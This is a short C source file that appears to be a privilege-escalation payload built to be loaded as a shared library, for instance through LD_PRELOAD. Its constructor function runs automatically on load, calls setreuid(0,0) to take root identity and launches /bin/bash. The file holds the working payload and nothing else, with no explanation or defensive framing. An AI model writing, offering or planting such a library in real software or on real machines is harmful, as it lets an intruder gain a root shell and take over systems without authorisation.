#include <stdlib.h>
#include <unistd.h>

static void sample() __attribute__((constructor));

void sample(void)
{
    setreuid(0,0);
    system("/bin/bash");
}
